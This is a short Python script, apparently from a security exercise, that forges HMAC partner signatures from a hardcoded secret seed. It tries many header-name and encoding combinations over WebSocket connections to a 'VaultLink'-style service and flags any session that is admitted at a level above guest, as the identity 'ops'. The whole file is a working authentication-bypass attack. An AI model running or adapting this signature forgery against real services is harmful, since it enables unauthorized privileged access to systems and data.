import time, select, hmac, hashlib, base64, itertools
from ws import connect, recv_frame
SEED=bytes.fromhex("9b62aed8c3d31cc08cb70535ee8917176125acc68bf3191617773c452d16cc48")
PH=["X-Partner","X-Partner-Id","X-Partner-Identity","X-Identity","X-VaultLink-Partner","X-Vault-Partner","X-Partner-Name","X-User"]
SH=["X-Partner-Signature","X-Partner-Sig","X-Signature","X-Partner-Token","X-Auth","Authorization","X-VaultLink-Signature","X-Sign","X-Token"]
def sigs(partner):
    d=hmac.new(SEED,partner.encode(),hashlib.sha256).digest()
    return [d.hex(), base64.b64encode(d).decode(), hmac.new(SEED,partner.encode(),hashlib.sha1).hexdigest()]
def trial(hdrs):
    try:
        s,resp=connect(extra_headers=hdrs); s.setblocking(False)
        out=[]; end=time.time()+0.7
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.08)
            if r:
                try: out.append(recv_frame(s)[1])
                except Exception: out.append(b"EOF"); break
        s.close()
        return out
    except Exception:
        return None
hit=0
for p in PH:
    for sh in SH:
        for sv in sigs("ops"):
            out=trial({p:"ops", sh:sv})
            rdy=[x for x in out or [] if isinstance(x,bytes) and x.startswith(b"READY")]
            if rdy and rdy[0]!=b"READY guest":
                print("HIT",p,sh,sv[:12],rdy,flush=True); hit+=1
print("hits",hit)
